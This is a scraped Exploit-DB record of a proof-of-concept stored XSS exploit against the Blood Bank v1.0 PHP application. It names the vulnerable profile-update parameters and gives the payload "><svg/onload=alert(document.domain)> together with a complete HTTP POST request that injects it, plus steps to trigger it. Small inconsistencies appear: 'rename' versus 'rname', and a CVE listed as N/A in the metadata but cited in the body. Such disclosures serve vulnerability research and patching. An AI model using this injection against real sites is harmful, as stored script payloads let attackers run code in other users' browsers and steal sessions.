{"source": "https://www.exploit-db.com/exploits/51955", "vulnName": "Blood Bank v1.0 - Stored Cross Site Scripting (XSS)", "vulnEDBID": "51955", "vulnCVE": "N/A", "author": "ERSIN ERENLER", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-04-02", "vulnContent": "# Exploit Title: Blood Bank v1.0 Stored Cross Site Scripting (XSS)\n# Date: 2023-11-14\n# Exploit Author: Ersin Erenler\n# Vendor Homepage: https://code-projects.org/blood-bank-in-php-with-source-code\n# Software Link: https://download-media.code-projects.org/2020/11/Blood_Bank_In_PHP_With_Source_code.zip\n# Version: 1.0\n# Tested on: Windows/Linux, Apache 2.4.54, PHP 8.2.0\n# CVE : CVE-2023-46020\n\n-------------------------------------------------------------------------------\n\n# Description:\n\nThe parameters rename, remail, rphone, and rcity in the /file/updateprofile.php file of Code-Projects Blood Bank V1.0 are susceptible to Stored Cross-Site Scripting (XSS). This vulnerability arises due to insufficient input validation and sanitation of user-supplied data. An attacker can exploit this weakness by injecting malicious scripts into these parameters, which, when stored on the server, may be executed when other users view the affected user's profile.\n\nVulnerable File: updateprofile.php\n\nParameters: rename, remail, rphone, rcity\n\n# Proof of Concept:\n----------------------\n\n1. Intercept the POST request to updateprofile.php via Burp Suite\n2. Inject the payload to the vulnerable parameters\n3. Payload: \"><svg/onload=alert(document.domain)>\n4. Example request for rname parameter:\n\n---\n\nPOST /bloodbank/file/updateprofile.php HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 103\nOrigin: http://localhost\nConnection: close\nReferer: http://localhost/bloodbank/rprofile.php?id=1\nCookie: PHPSESSID=<some-cookie-value>\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\n\nrname=test\"><svg/onload=alert(document.domain)>&remail=test%40gmail.com&rpassword=test&rphone=8875643456&rcity=lucknow&bg=A%2B&update=Update\n\n----\n\n5. Go to the profile page and trigger the XSS\n\nXSS Payload:\n\n\"><svg/onload=alert(document.domain)>\n            "}